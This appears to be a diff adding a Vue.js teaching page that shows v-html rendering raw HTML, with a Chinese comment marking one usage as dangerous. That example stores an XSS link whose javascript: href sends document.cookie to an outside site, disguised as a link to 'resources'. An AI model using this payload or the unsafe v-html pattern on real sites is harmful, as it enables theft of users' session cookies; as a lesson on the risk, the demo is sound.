@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="../js/vue.js"></script>
+</head>
+
+<body>
+
+
+    <!-- v-text 内容会覆盖标签内的文字 -->
+
+    <div class="root">
+        <span v-html="name1">一个Span标签</span>
+
+        <hr>
+
+        <!-- 危险的用法 -->
+        <span v-html="name2"></span>
+    </div>
+
+
+    <script>
+        let vm = new Vue({
+            el: ".root",
+            data: {
+                name1:"This is a Test",
+                name2: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>这里点一下，有资源</a>'
+            }
+        })
+
+    </script>
+</body>
+
+</html>
